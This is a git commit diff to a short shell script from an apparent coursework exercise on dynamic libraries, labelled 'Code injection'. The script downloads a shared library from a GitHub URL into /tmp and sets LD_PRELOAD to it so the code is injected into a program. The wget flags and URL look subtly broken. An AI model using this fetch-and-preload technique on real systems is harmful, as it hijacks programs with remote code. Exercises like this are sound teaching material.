51cdd7b188e24a4b31713ea07b4b72b9e02c17f4
juankarlos999 <juan_karlos_999@hotmail.com>
2020-05-05 00:15:09 -0500

    Code injection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -PO /tmp/win.so https://github.com/juankarlos999/holbertonschool-low_level_programming/tree/master/0x18-dynamic_libraries/balloto.so
+wget -P -O /tmp/win.so https://github.com/juankarlos999/holbertonschool-low_level_programming/tree/master/0x18-dynamic_libraries/balloto.so
 export LD_PRELOAD=/tmp/win.so
